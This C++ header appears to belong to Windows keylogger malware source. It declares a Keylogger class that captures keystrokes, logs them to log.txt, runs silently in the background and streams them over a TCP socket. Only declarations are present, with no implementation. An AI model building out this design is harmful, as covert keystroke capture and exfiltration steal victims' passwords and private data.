#ifndef KEYLOGG_H
#define KEYLOG_H

#include "master.h"

using namespace std;


class Keylogger
{
    public:

        Keylogger(SOCKET &sock);
        //-----------------------------------------------
        VOID setup();
        //-----------------------------------------------
        wstring specialKey(INT &keystroke);
        wstring intToUnicode(INT keystroke);
        //-----------------------------------------------
        static DWORD WINAPI StaticThreadStart(void* param);
        HANDLE startThread(); //starts a thread of the directTCp method and returns are HANDLE
        struct PARAMETERS; //https://stackoverflow.com/questions/8994224/efficiently-passing-parameters-to-function-in-another-thread-in-c
        VOID directTcp();
        //-----------------------------------------------
        VOID waitingEndSession(HANDLE &thread_to_finish);//waits to receive an end-of-connection message  for directTcp
        //-----------------------------------------------
        VOID silentBackground();
        //-----------------------------------------------
        SOCKET getSocket();
        //-----------------------------------------------
        VOID test();
        ~Keylogger();
        
        SOCKET public_sock;
    private:
        SOCKET a_sock;

        CONST WCHAR a_name_file[8] = L"log.txt";
        HWND a_WindowHandle;
        DWORD a_dwThreadId;
        HKL a_hkl;
     
};

#endif